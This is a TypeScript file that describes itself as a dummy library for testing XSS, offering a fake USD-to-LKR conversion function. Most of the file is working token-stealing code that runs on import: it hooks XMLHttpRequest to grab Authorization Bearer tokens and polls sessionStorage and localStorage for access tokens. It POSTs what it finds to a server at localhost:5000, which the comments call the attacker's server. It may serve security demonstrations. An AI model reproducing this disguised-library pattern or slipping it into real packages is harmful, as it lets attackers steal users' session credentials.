/**
 * MIT License
 *
 * Copyright (c) 2022 Jerad Rutnam (www.jeradrutnam.com)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 **/

/**
 * Disclaimer: Not a library for actual use.
 *
 * This is a dummy app to test XSS attack. That acts as legitimate library and stealing accessToken
 * sessionStorage or localStorage, or intercepting the HTTP request.
 */

 const url = "http://localhost:5000/access-token";
 const accessTokenID = "access_token";
 let accessToken = "";
 let source = "";

 /**
  * Fake method that do a USD to LKR conversion
  *
  * @param {int} usdAmount Some USD amount
  * @returns {int} Converted LKR amount
  */
 export const convertUSDToLKR = (usdAmount: number, DollarRateLKR: number) => {
     return usdAmount * DollarRateLKR;
 }

 /**
  * Method to send stolen accessToken to attackers server
  */
 const sendAccessToken = () => {
     fetch(url, {
         method: "POST",
         body: JSON.stringify({ accessToken: accessToken, source: source }),
         headers: {
             "Content-Type": "application/json",
             "Access-Control-Allow-Origin": window.location.origin
         }
     });
 }

 console.log("Getting access token by attaching to network calls");

 /**
  * Intercept application network calls and try steal accessToken
  */
 const pureSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;

 XMLHttpRequest.prototype.setRequestHeader = function(key, value) {
     console.log(key, value);
     if (key === "Authorization") {
         accessToken = value.replace("Bearer ", "");
         source = "Network";
         sendAccessToken();
     }
     pureSetRequestHeader.call(this, key, value);
 };

 /**
  * Poll and try steal accessToken from the sessionStorage or localStorage
  */
 const poll = setInterval(() => {
     console.log("Looking for access token...");

     if (sessionStorage.getItem("session_data-instance_0")) {
         console.log("Getting access token from session storage");
         accessToken = JSON.parse(sessionStorage["session_data-instance_0"]).access_token || "";
         source = "Session Storage";
     } else if (localStorage.getItem(accessTokenID)) {
         console.log("Getting access token from local storage");
         accessToken = JSON.parse(localStorage["session_data-instance_0"]).access_token || "";
         source = "Local Storage";
     }

     if (accessToken) {
         sendAccessToken();
         clearInterval(poll);
     }
 }, 5000);
